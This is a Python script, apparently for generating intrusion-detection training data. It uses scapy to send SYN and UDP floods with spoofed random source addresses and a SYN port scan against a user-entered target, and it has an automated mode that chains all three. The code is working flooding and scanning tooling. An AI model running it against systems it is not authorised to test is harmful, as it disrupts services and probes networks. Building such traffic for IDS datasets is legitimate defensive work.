import sys
import time
import random
import threading
from scapy.all import IP, TCP, UDP, send, conf

# This script is designed to generate many distinct flows for IDS dataset creation.
# It randomizes source IPs and ports to ensure the IDS sees many different "attacks".

def syn_flood(target_ip, target_port, count=200):
    print(f"[!] Launching SYN Flood on {target_ip}:{target_port}...")
    for i in range(count):
        # Varying src_ip and src_port creates NEW FLOWS in the IDS
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=False)
        if i % 50 == 0: print(f"  Sent {i} SYN packets...")
    print("[+] SYN Flood complete.")

def udp_flood(target_ip, target_port, count=200):
    print(f"[!] Launching UDP Flood on {target_ip}:{target_port}...")
    for i in range(count):
        src_ip = f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        payload = random._urandom(random.randint(64, 512))
        
        pkt = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
        send(pkt, verbose=False)
        if i % 50 == 0: print(f"  Sent {i} UDP packets...")
    print("[+] UDP Flood complete.")

def port_scan(target_ip, start_port, end_port):
    print(f"[!] Launching Port Scan on {target_ip} (Ports {start_port}-{end_port})...")
    # A scan naturally creates many flows because the destination port changes
    for port in range(start_port, end_port + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        send(pkt, verbose=False)
        if port % 20 == 0: print(f"  Scanning port {port}...")
    print("[+] Port Scan complete.")

def automated_attack(target_ip):
    print(f"\n[***] STARTING AUTOMATED MULTI-ATTACK SIMULATION [***]")
    print(f"[***] Target: {target_ip} [***]\n")
    
    # Cycle through different attacks with randomization
    syn_flood(target_ip, 80, count=150)
    time.sleep(2)
    port_scan(target_ip, 20, 150)
    time.sleep(2)
    udp_flood(target_ip, 53, count=150)
    time.sleep(2)
    syn_flood(target_ip, 443, count=150)
    
    print(f"\n[***] ALL SIMULATIONS FINISHED [***]")
    print("[TIP] Check your IDS terminal and the 'output/' folder for results.")

if __name__ == "__main__":
    print("\n" + "="*40)
    print("  ADVANCED IDS ATTACK SIMULATOR")
    print("="*40)
    
    target = input("\nEnter Target IP (your local IP): ").strip()
    if not target:
        print("Error: IP required.")
        sys.exit(1)
        
    print("\nSelect Simulation Mode:")
    print("1. SYN Flood (Intense)")
    print("2. UDP Flood (Intense)")
    print("3. Port Scan (Broad)")
    print("4. AUTOMATED ALL (Best for Datasets)")
    
    choice = input("\nChoice (1-4): ")
    
    if choice == '1':
        port = int(input("Target port: "))
        syn_flood(target, port)
    elif choice == '2':
        port = int(input("Target port: "))
        udp_flood(target, port)
    elif choice == '3':
        start = int(input("Start port: "))
        end = int(input("End port: "))
        port_scan(target, start, end)
    elif choice == '4':
        automated_attack(target)
    else:
        print("Invalid choice.")
